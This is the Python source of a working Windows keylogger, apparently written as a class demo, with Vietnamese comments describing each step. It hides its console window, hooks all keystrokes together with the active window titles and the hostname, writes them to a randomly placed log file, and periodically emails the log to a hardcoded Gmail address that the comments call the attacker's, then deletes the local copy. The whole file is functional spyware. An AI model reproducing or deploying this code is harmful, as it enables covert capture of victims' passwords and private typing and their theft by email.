# Vì lý do demo
# Thầy có thể thay đổi địa chỉ mail để gửi file log về tại receiver.txt

# win32api, win32console, win32gui được sử dụng để ẩn cửa sổ console
import win32api 
import win32console 
import win32gui 

# keyboard được dùng để hook các sự kiện nhấn phím
import keyboard as kb

# time được dùng để thiết lập thời gian ghi file log và gửi mail
import time

# threading để thiết lập các luồng ghi file log và gửi mail riêng so với luồng chính
import threading

# os để lấy một số thông tin cần thiết như username, hostname
import os

# pygetwindow dùng để lấy tiêu đề của cửa sổ đang ghi
import pygetwindow as gw 

# communicater là một thư viện tự tạo, sử dụng để gửi file log về mail cho attacker
import communicater

# Utils là một thư viện tự tạo, dùng để lấy kích thước file và sinh đường
# ... dẫn ngẫu nhiên để lưu file log
from Utils import get_file_size
from Utils import Generate_Writable_Path as gen_path

# Ẩn cửa số window
win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0)

# kiểm tra đây có phải là ký tự bình thường hay ko?
# Nếu là ký tự bình thường => trả về True
# Nếu là ký tự đặc biệt => Trả về False
def is_alpha(c):
    if len(c) > 1:
        return False

    if ord(c) >= 32 and ord(c) <= 126:
        return True
    return False

# Lớp Logger dùng để xử lý các thao tác khi nhấn phím
# ... và thực hiện các chức năng khác như ghi vào file,
# ... gửi mail, ...
# Ý tưởng chính:
#   + Đối với các thao tác khi nhấn phím:
#       * Đối với các ký tự đặc biệt, khi nhấn phím xuống, ta bật 
#         .. các flag tương ứng của phím lên, trong đoạn code phía
#         .. dưới, các flag được lưu trong biến self.pressed_special
#         .. Nếu phím được thả ra, ta sẽ tắt các cờ tương ứng đi.
#       * Đối với các ký tự bình thường, ta chỉ xét trường hợp phím
#         .. được nhấn xuống, lúc đó ta sẽ kiểm tra các cờ và chọn
#         .. cách lưu phù hơp, chẳng hạn cờ "ctrl" được bật, đồng thời
#         .. phím "tab" được nhấn, ta sẽ ghi vào file "<ctr-tab>".
#   + Đối với chức năng lưu các ký tự vào file:
#       * Sau mỗi thời gian nhất định, ta sẽ lưu tất cả các ký tự hiện
#         .. tại vào file.
#       * Các ký tự sẽ được lưu cùng tiêu đề của cửa sổ mà ký tự đó được nhấn.
#   + Đối với chức năng gửi mail file log về attacker.
#       * Sau mỗi thời gian nhất định ta sẽ kiểm tra file để gửi đi.
#       * Nếu kích thước file lớn hơn 1 ngưỡng nào đó, ta sẽ gửi file về mail
#         .. của attacker. 
class Logger:
    # Vì mỗi ký tự đặc biệt có 2 nơi để nhấn, phải và trái, nên ta cần ánh xạ
    # .. nó về cùng một ký tự duy nhất
    keymap = dict()
    keymap.update({"alt" : "alt", "right alt": "alt"})
    keymap.update({"ctrl" : "ctrl", "right ctrl" : "ctrl"})
    keymap.update({"shift" : "shift", "right shift" : "shift"})
    keymap.update({"window" : "window"})

    def __init__(self, write_after = 3, send_after = 60, receiver = "huykingsofm@gmail.com"):
        # tên máy sẽ được ghi vào file log để attacker biết được
        # file log được lấy từ máy của nạn nhân nào.
        self.hostname = os.getenv('COMPUTERNAME')

        # Địa chỉ để gửi mail về (attacker's mail)
        self.receiver = receiver

        # Thiết lập nơi lưu file
        self.__set_up__()

        # Khởi tạo biến để lưu các phím được nhấn
        self.logger = ""

        # Khởi tạo biến để lưu cửa số của phím được nhấn
        # ..Nếu người dùng nhấn phím ở cửa sổ khác cửa sổ hiện tại,
        # ..toàn bộ phím được lưu trong self.logger sẽ được lưu vào
        # ..file, sau đó thiết lập lại biến self.WindowName dưới đây
        # ..lưu cửa số mới hiện tại. Đồng thời biến self.logger sẽ 
        # ..được thiết lập thành "".
        self.WindowName = None

        # Biến số quyết định thời gian lưu file định kỳ, đơn vị là giây
        self.write_after = write_after

        # Biến số quyết định thời gian gửi mail định ký, đơn vị là giây
        self.send_after = send_after

        # Cờ của các ký tự đặc biệt
        self.pressed_special = {"alt":False, "ctrl" : False, "shift" : False, "window" : False}

        # Luồng lưu file định kỳ được chạy riêng biệt
        t = threading.Thread(target= self.save)
        t.setDaemon(True)
        t.start()

        # Luồng gửi mail định kỳ được chạy riêng biệt
        t = threading.Thread(target= self.send)
        t.setDaemon(True)
        t.start()

    # Hàm sử lý khi phím được nhấn
    def __OnKeyDownEvent__(self, event: kb.KeyboardEvent):
        # Lấy title của cửa sổ mà phím được nhấn
        WindowName = gw.getActiveWindowTitle()

        # Nếu cửa sổ hiện tại khác cửa sổ trước đó
        # ..thì lưu toàn bộ ký tự hiện tại vào file
        # ..đồng thời thiết lập lại các biến số.
        if self.WindowName != WindowName:
            with open(self.filename, mode= "at", encoding= "utf-8") as f:
                f.write("{}\n[{}]".format(self.logger, WindowName))
                self.logger = ""
                self.WindowName = WindowName

        # Nếu ký tự được nhấn là ký tự đặc biệt
        # ..thì bật cờ tương ứng với ký tự đó lên
        if event.name in kb.all_modifiers:
            key = Logger.keymap[event.name]
            self.pressed_special[key] = True
        
        # Nếu ký tự được nhấn không phải ký tự đặc biệt
        else:
            # Các lệnh dưới đây để định dạng lại ký tự sẽ lưu dễ
            # ..nhìn hơn.
            anykey = False
            combinal_key = "<"
            if  self.pressed_special["alt"]:
                combinal_key += "alt"
                anykey = True

            if self.pressed_special["ctrl"]:
                if anykey == False:
                    combinal_key += "ctrl"
                else:
                    combinal_key += "-ctrl"
                anykey = True

            if self.pressed_special["window"]:
                if anykey == False:
                    combinal_key += "win"
                else:
                    combinal_key += "-win"
                anykey = True
            
            if self.pressed_special["shift"] == True:
                if not anykey:
                    combinal_key += "shift"
                else:
                    combinal_key += "-shift"
            
            if not anykey:
                if is_alpha(event.name):
                    combinal_key = event.name
                else:
                    combinal_key = "<{}>".format(event.name)
            else:
                combinal_key += "-{}>".format(event.name)

            # Thêm ký tự đã nhấn vào trong logger
            self.logger += combinal_key
    
        return True

    # Hàm xử lý sự kiện thả phím
    # ..Đơn giản là tắt cờ của phím đặc biệt được thả.
    # ..Lưu ý hàm này không xử lý các ký tự khác
    def __OnKeyUpEvent__(self, event):
        if event.name in kb.all_modifiers:
            key = Logger.keymap[event.name]
            self.pressed_special[key] = False
        return True

    # Tổng hợp hàm nhấn và thả
    def OnKeyBoardEvent(self, event):
        try:
            if event.event_type == "down":
                return self.__OnKeyDownEvent__(event)
            else:
                return self.__OnKeyUpEvent__(event)
        except Exception as e:
            print(e)
            return True

    # Hàm để lưu file log
    def __save__(self):
        if self.logger:
            with open(self.filename, mode= "at") as f:
                f.write(self.logger)
                self.logger = ""

    # Hàm để lưu file log định kỳ
    def save(self):
        while True:
            time.sleep(self.write_after)
            self.__save__()

    # Hàm để gửi mail
    def __send__(self):
        if get_file_size(self.filename) > 1024: # 1KB
            try:
                communicater.send(self.filename, self.receiver)
            except:
                return

            self.logger = ""
            self.WindowName = None
            os.remove(self.filename)
            self.__set_up__()

    # Hàm để gửi mail định kỳ
    def send(self):
        while True:
            time.sleep(self.send_after)
            if communicater.check():
                self.__send__()

    # Hàm để tạo mới nơi gửi file
    def __set_up__(self):
        # Tạo mới đường dẫn gửi file
        self.filename = gen_path.gen() + "log-{}-{}.txt".format(self.hostname, int(time.time()))
        print("Now log file is {}".format(self.filename))
        
        # Lưu file tại đường dẫn mới
        with open(self.filename, "wt") as f:
            f.write("[KeyLogger - {}]".format(time.asctime()))

# Hàm kiểm tra
def __onkey_test__(event):
    print(event.event_type)

if __name__ == "__main__":
    with open("receiver.txt", mode="rt") as f:
        receiver=f.read() 
    
    # Tạo một đối tượng logger với thời gian gửi mail định kỳ là 30
    logger = Logger(send_after= 30, receiver= receiver)

    # Thiết lập hàm callback cho keyboardhook
    kb.hook(logger.OnKeyBoardEvent)

    # Chờ các ký tự
    kb.wait()